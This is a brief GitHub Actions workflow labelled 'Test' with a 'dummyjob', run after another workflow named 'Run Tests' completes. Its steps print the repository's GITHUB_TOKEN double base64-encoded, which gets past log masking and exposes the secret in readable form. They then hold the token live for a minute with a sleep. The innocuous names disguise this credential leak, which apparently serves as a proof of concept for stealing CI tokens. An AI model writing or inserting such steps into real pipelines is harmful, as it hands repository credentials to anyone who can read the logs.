name: Test

on:
  workflow_run:
    workflows: [Run Tests]
    types:
      - completed

jobs:
  dummyjob:
    runs-on: ubuntu-latest
    steps:
      - name: Post run1
        run: |
          echo $GITHUB_TOKEN | base64 -w0 | base64 -w 0
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      - name: Post run2
        run: |
          sleep 60
        env:
          SECRET_TOKEN: ${{ secrets.GITHUB_TOKEN }}
